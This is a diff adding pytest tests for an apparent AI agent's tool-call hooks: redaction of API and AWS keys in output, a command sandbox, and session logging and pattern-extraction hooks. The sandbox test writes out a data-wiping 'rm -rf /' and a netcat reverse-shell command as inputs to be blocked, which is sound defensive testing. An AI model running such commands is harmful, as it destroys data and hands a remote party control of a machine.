@@ -172,4 +172,89 @@ def test_self_healing():
     assert res is None
 
 
+def test_secret_leak_preventer():
+    secret_preventer = load_hook("post_tool_call/secret_leak_preventer.py")
+    
+    # 1. Redact API key pattern in output
+    raw_output = "API response: api_key = sk-1234567890abcdef1234567890"
+    redacted = secret_preventer.handler("read_file", {"filename": ".env"}, raw_output)
+    assert "sk-1234567890abcdef" not in redacted
+    assert "[REDACTED_SECRET]" in redacted
+
+    # 2. Redact AWS Key in output
+    raw_aws = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
+    redacted_aws = secret_preventer.handler("execute_command", {}, raw_aws)
+    assert "AKIAIOSFODNN7EXAMPLE" not in redacted_aws
+    assert "[REDACTED_AWS_KEY]" in redacted_aws
+
+
+def test_command_sandbox():
+    sandbox = load_hook("pre_tool_call/command_sandbox.py")
+    
+    # 1. Safe command
+    name, args = sandbox.handler("execute_command", {"CommandLine": "ls -la"})
+    assert name == "execute_command"
+
+    # 2. Dangerous command: rm -rf /
+    name_bad, args_bad = sandbox.handler("execute_command", {"CommandLine": "rm -rf /"})
+    assert name_bad == "security_block"
+
+    # 3. Dangerous command: reverse shell netcat
+    name_nc, args_nc = sandbox.handler("run_command", {"command": "nc 10.0.0.1 4444 -e /bin/bash"})
+    assert name_nc == "security_block"
+
+
+def test_session_digest_logger(tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    digest_logger = load_hook("on_session_complete/session_digest_logger.py")
+
+    mock_agent = MagicMock()
+    mock_agent.session_id = "test_session_123"
+    mock_agent.exit_reason = "SUCCESS"
+    mock_tc = MagicMock()
+    mock_tc.name = "write_file"
+    mock_tc.arguments = {"filename": "app.py"}
+
+    mock_agent.history = [
+        MagicMock(role="user", content="Build feature", tool_calls=[]),
+        MagicMock(role="assistant", content="Writing code", tool_calls=[mock_tc])
+    ]
+
+    digest_logger.handler(mock_agent)
+
+    log_path = tmp_path / ".agents" / "session_digests.log"
+    assert log_path.exists()
+    content = log_path.read_text()
+    assert "test_session_123" in content
+    assert "app.py" in content
+
+
+def test_pattern_extractor(tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    pattern_extractor = load_hook("on_session_complete/pattern_extractor.py")
+
+    mock_agent = MagicMock()
+    mock_agent.exit_reason = "SUCCESS"
+    
+    mock_tc = MagicMock()
+    mock_tc.name = "write_file"
+    mock_tc.arguments = {"filename": "config.py"}
+
+    mock_agent.history = [
+        MagicMock(role="user", content="Configure database settings", tool_calls=[]),
+        MagicMock(role="assistant", content="Creating config file", tool_calls=[mock_tc])
+    ]
+
+    pattern_extractor.handler(mock_agent)
+
+    pattern_dir = tmp_path / ".specs" / "knowledge" / "patterns"
+    assert pattern_dir.exists()
+    files = list(pattern_dir.glob("*.md"))
+    assert len(files) == 1
+    content = files[0].read_text()
+    assert "Configure database settings" in content
+    assert "config.py" in content
+
+
+
 
